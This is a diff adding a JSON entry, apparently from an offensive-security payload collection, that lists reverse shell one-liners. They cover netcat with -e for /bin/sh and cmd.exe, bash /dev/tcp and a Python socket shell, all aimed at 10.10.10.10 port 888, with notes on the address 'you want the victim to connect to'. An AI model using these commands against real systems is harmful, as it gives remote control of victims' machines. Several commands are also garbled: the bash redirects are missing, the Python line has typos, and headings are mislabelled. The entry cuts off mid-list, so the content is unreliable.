@@ -1,0 +1,27 @@
+{
+  "id": "temp_331df3795261",
+  "category": "temp",
+  "title": "reverse shells",
+  "description": "# Reverse Shell Commands\nThe following are some useful commands to start listeners and reverse shells in Linux and Windows-based systems.\n\n## Netcat Linux Reverse Shell\n`nc 10.10.10.10 888 -e /bin/sh`\n* 10.10.10.10 is the IP address of the machine you want the victim to connect to.\n* 888 is the port number (change this to whatever port you would like to use, just make sure that no firewall is blocking it).\n\n## Netcat Linux Reverse Shell\n`nc 10.10.10.10 888 -e cmd.exe`\n* 10.10.10.10 is the IP add",
+  "payloads": [
+    "# Reverse Shell Commands",
+    "The following are some useful commands to start listeners and reverse shells in Linux and Windows-based systems.",
+    "## Netcat Linux Reverse Shell",
+    "`nc 10.10.10.10 888 -e /bin/sh`",
+    "* 10.10.10.10 is the IP address of the machine you want the victim to connect to.",
+    "* 888 is the port number (change this to whatever port you would like to use, just make sure that no firewall is blocking it).",
+    "## Netcat Linux Reverse Shell",
+    "`nc 10.10.10.10 888 -e cmd.exe`",
+    "* 10.10.10.10 is the IP address of the machine you want the victim to connect to.",
+    "* 888 is the port number (change this to whatever port you would like to use, just make sure that no firewall is blocking it).",
+    "## Using Bash",
+    "`bash -i & /dev/tcp/10.10.10.10/888 0 &1`",
+    "## Using Python",
+    "`python -c 'import socket, subprocess, os; s=socket. socket (socket.AF_INET, socket.SOCK_STREAM); s.connect((\"10.10.10.10\",888)); os.dup2(s.fileno(),0); os.dup2(s.fileno(l,1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'`",
+    "## Using Ruby"
+  ],
+  "source": "h4cker",
+  "references": [
+    "/workspaces/hunter-skill/h4cker/temp/Ethical_Hacking/Reconnaissance_and_Enumeration/Scripting_for_Recon_and_Enumeration/programming_and_scripting_for_cybersecurity/post_exploitation/reverse_shells.md"
+  ]
+}
